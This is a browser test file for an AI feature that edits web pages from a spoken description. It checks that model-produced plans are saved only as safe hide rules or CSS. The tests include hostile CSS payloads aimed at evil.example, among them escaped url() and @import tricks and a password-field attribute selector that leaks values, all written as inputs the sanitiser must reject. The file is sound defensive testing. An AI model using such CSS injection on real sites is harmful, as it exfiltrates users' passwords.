/* Any copyright is dedicated to the Public Domain.
   https://creativecommons.org/publicdomain/zero/1.0/ */

"use strict";

// W23 page-act: page edits by description (page-6.x). Hides keep as named
// zaps, style changes as one CSS-only Boost per sentence, anything needing
// script is done once and never kept, and Esc is Just this time.

const { WhimsyAIPageEdits, WhimsyPageBar, sanitizeCSS, safeSelector, rulesFromCSS, cleanRules, cssFromRules } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAIPageEdits.sys.mjs");
const { WhimsyAIProviders } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAIProviders.sys.mjs");
const { WhimsyZap } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyZap.sys.mjs");
const { gZenBoostsManager } = ChromeUtils.importESModule("resource:///modules/zen/boosts/ZenBoostsManager.sys.mjs");

const PAGE = getRootDirectory(gTestPath).replace("chrome://mochitests/content", "https://example.com") + "whimsy_ai_article_edit.html";
const DOMAIN = "example.com";

const PLANS = {
  "hide the sidebar": { hide: ["#sidebar"], css: "", click: [], done: "Hid the sidebar" },
  "make the text bigger": {
    hide: [],
    css: "body { font-size: 22px; } body { background: url(https://evil.example/x.png) } p { color: rgb(0 0 0 / 80%); behavior: x; }",
    click: [],
    done: "Made the text bigger",
  },
  "expand every comment": { hide: [], css: "", click: ["#comments summary", "a", "#nope"], done: "Expanded 2 comments" },
  "hide the comments": { hide: ["#comments"], css: "", click: [], done: "Hid the comments" },
  "hide the weather widget": { hide: ["#weather"], css: "", click: [], done: "", missing: "Couldn’t find a weather widget on this page." },
};

function cleanBoosts() {
  for (const boost of gZenBoostsManager.loadBoostsFromStore(DOMAIN) ?? []) {
    gZenBoostsManager.deleteBoost(boost);
  }
  Services.prefs.clearUserPref("whimsy.ai.page-edits");
}

add_setup(async function () {
  await SpecialPowers.pushPrefEnv({ set: [["whimsy.feature.ai-hints", false]] });
  WhimsyAIProviders.setTestProvider(async request => {
    const sentence = /Sentence: (.*)/.exec(request.prompt)?.[1];
    return JSON.stringify(PLANS[sentence] ?? { hide: [], css: "", click: [] });
  });
  registerCleanupFunction(() => {
    WhimsyAIProviders.setTestProvider(null);
    WhimsyPageBar.hide(window);
    cleanBoosts();
    closeToasts();
  });
});

const display = (browser, selector) => SpecialPowers.spawn(browser, [selector], s => content.getComputedStyle(content.document.querySelector(s)).display);

async function barShown() {
  const bar = await TestUtils.waitForCondition(() => WhimsyPageBar.current(window), "The bar shows");
  await TestUtils.waitForCondition(() => bar.el.getBoundingClientRect().width > 0 && bar.el.querySelector("button"), "Laid out");
  await document.l10n.translateFragment(bar.el);
  return bar.el;
}

add_task(async function hide_saves_named_zap() {
  await BrowserTestUtils.withNewTab(PAGE, async browser => {
    const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the sidebar");
    is(result.kind, "zap", "A hide is a zap");
    is(await display(browser, "#sidebar"), "none", "Applied live, before anything is saved");
    const bar = await barShown();
    const keep = bar.querySelector("[data-button=keep]");
    ok(keep.classList.contains("primary"), "Keep on this site is the default");
    await TestUtils.waitForCondition(() => bar.ownerDocument.activeElement == keep, "The bar takes focus");
    EventUtils.synthesizeKey("KEY_Enter");
    await TestUtils.waitForCondition(() => !WhimsyPageBar.current(window), "Enter keeps it");
    ok(WhimsyZap.getZapSelectors(DOMAIN).includes("#sidebar"), "Saved as a zapped element");
    is(WhimsyAIPageEdits.zapName(DOMAIN, "#sidebar"), "hide the sidebar", "Named by the sentence");
    is(WhimsyAIPageEdits.edits(DOMAIN).boosts.length, 0, "Not a Boost");

    // The saved toast's Undo takes it back off the site and the page.
    const undo = await TestUtils.waitForCondition(() => document.getElementById("whimsy-undo-toast-button"), "The saved toast offers Undo");
    await TestUtils.waitForCondition(() => BrowserTestUtils.isVisible(undo) && undo.getBoundingClientRect().width > 0, "Undo is laid out");
    await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
    EventUtils.synthesizeMouseAtCenter(undo, {});
    await TestUtils.waitForCondition(() => !WhimsyZap.getZapSelectors(DOMAIN).includes("#sidebar"), "Undo unsaves the zap");
    ok(!WhimsyAIPageEdits.zapName(DOMAIN, "#sidebar"), "And its name");
    await TestUtils.waitForCondition(async () => (await display(browser, "#sidebar")) != "none", "The sidebar is back");
  });
  cleanBoosts();
  closeToasts();
});

add_task(async function style_saves_css_only_boost() {
  await BrowserTestUtils.withNewTab(PAGE, async browser => {
    const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "make the text bigger");
    is(result.kind, "boost", "A style change is a Boost");
    ok(!/url\(|@import|evil/.test(result.css), "Its CSS can't load anything");
    is(await SpecialPowers.spawn(browser, [], () => content.getComputedStyle(content.document.body).fontSize), "22px", "Applied live");
    const bar = await barShown();
    EventUtils.synthesizeMouseAtCenter(bar.querySelector("[data-button=keep]"), {});
    await TestUtils.waitForCondition(() => !WhimsyPageBar.current(window), "Kept");
    const boosts = WhimsyAIPageEdits.edits(DOMAIN).boosts;
    is(boosts.length, 1, "One Boost for the sentence");
    is(boosts[0].sentence, "make the text bigger", "Named by it");
    const css = gZenBoostsManager.loadActiveBoostFromStore(DOMAIN).boostEntry.boostData.customCSS;
    ok(css.includes("font-size: 22px"), "The site's Boost has the CSS");
    ok(!/url\(|@import|evil|<script/i.test(css), "Only CSS, nothing that loads or runs");
    WhimsyAIPageEdits.setBoostOn(DOMAIN, boosts[0].id, false);
    ok(!gZenBoostsManager.loadActiveBoostFromStore(DOMAIN).boostEntry.boostData.customCSS.includes("22px"), "Turn Off takes it out");
  });
  is(sanitizeCSS("a { behavior: url(x.htc); -moz-binding: url(x) } b { color: red }").includes("color: red"), true, "Plain CSS stays");
  cleanBoosts();
  closeToasts();
});

// W23 secfix M5: Change this page only hides, restyles, or reorders. A
// plan that asks to press the page's controls presses nothing.
add_task(async function never_presses_page_controls() {
  await BrowserTestUtils.withNewTab(PAGE, async browser => {
    const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "expand every comment");
    is(result.kind, "missing", "Nothing it may do here");
    ok(!("clicked" in result), "and nothing was pressed");
    const open = await SpecialPowers.spawn(browser, [], () => [...content.document.querySelectorAll("details")].some(d => d.open));
    ok(!open, "Every comment is still collapsed");
    await barShown();
    WhimsyPageBar.hide(window);
    is(WhimsyAIPageEdits.edits(DOMAIN).boosts.length, 0, "No Boost");
    is(WhimsyZap.getZapSelectors(DOMAIN).length, 0, "No zap");
  });
});

// W23 secfix M1/M2: nothing a model or a page writes can make a kept rule
// load a URL or start another rule.
add_task(async function kept_rules_are_structured_and_safe() {
  const injected = 'x{} input[name=password][value^=a]{background:url(https://evil.example/a)} y';
  is(safeSelector(injected), null, "A selector that closes its rule is refused");
  is(safeSelector("#a /* */ b"), null, "Comments are refused");
  is(safeSelector("a[href^=http"), null, "A selector that doesn't parse is refused");
  is(safeSelector(" #comments > li:nth-of-type(2) "), "#comments > li:nth-of-type(2)", "A plain one is kept");
  for (const css of [
    "body{background:\\75 rl(https://evil.example/p)}",
    "body{background:u\\72l(https://evil.example/p)}",
    "@\\69mport url(https://evil.example/a.css); body { color: red }",
    "@import url(https://evil.example/a.css); body { color: red }",
    "body { background-image: image-set('https://evil.example/p' 1x) }",
    "body { color: red; } /* } body { background: url(x) } */",
  ]) {
    Assert.deepEqual(rulesFromCSS(css).filter(r => JSON.stringify(r).includes("evil")), [], `Nothing survives: ${css}`);
    ok(!/url|image-set|evil|@|\\/i.test(sanitizeCSS(css)), `and no CSS comes of it: ${css}`);
  }
  Assert.deepEqual(rulesFromCSS("article { font-size: 19px; width: 50%; position: fixed; content: 'x' } .ad { display: block }"),
    [{ selector: "article", props: { "font-size": "19px", width: "50%" } }],
    "Only allowlisted properties; display only as none");
  Assert.deepEqual(cleanRules([{ selector: "a", props: { color: "red", "background-image": "url(https://evil.example)" } }, { selector: "b{}", hide: true }]),
    [{ selector: "a", props: { color: "red" } }], "Stored rules are checked again before use");
  is(cssFromRules([{ selector: "#sidebar", hide: true }]), "#sidebar { display: none !important; }", "The CSS is generated from the rules");

  // A plan whose hide list carries an injected selector keeps only what matched.
  await BrowserTestUtils.withNewTab(PAGE, async () => {
    PLANS["hide the sidebar and the bad bit"] = { hide: ["#sidebar", injected], css: "", done: "Hid it" };
    const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the sidebar and the bad bit");
    Assert.deepEqual(result.hide, ["#sidebar"], "Only the selector that matched");
    await barShown();
    ok(WhimsyAIPageEdits.keep(window), "Kept");
    Assert.deepEqual(WhimsyZap.getZapSelectors(DOMAIN), ["#sidebar"], "The injected selector never reaches the site's Boost");
    delete PLANS["hide the sidebar and the bad bit"];
  });
  cleanBoosts();
  closeToasts();
});

add_task(async function just_this_time_esc() {
  await BrowserTestUtils.withNewTab(PAGE, async browser => {
    await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the comments");
    await barShown();
    await TestUtils.waitForCondition(() => document.activeElement?.closest(".whimsy-page-bar"), "The bar has focus");
    EventUtils.synthesizeKey("KEY_Escape");
    await TestUtils.waitForCondition(() => !WhimsyPageBar.current(window), "Esc is Just this time");
    is(await display(browser, "#comments"), "none", "The change stays on the page for now");
    is(WhimsyZap.getZapSelectors(DOMAIN).length, 0, "Nothing saved");
    is(WhimsyAIPageEdits.zapName(DOMAIN, "#comments"), null, "No name stored");

    // Undo puts the page back.
    await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the sidebar");
    const bar = await barShown();
    EventUtils.synthesizeMouseAtCenter(bar.querySelector("[data-button=undo]"), {});
    await TestUtils.waitForCondition(async () => (await display(browser, "#sidebar")) != "none", "Undo shows the sidebar again");

    // Not found: one line, nothing changed.
    const missing = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the weather widget");
    is(missing.kind, "missing", "Couldn't find it");
    const miss = await barShown();
    ok(miss.querySelector("[data-button=retry]"), "Try other words");
    await TestUtils.waitForCondition(() => document.activeElement == miss.querySelector("[data-button=retry]"), "The bar has focus");
    EventUtils.synthesizeKey("KEY_Escape");
    await TestUtils.waitForCondition(() => !WhimsyPageBar.current(window), "Esc dismisses");
  });
  cleanBoosts();
});
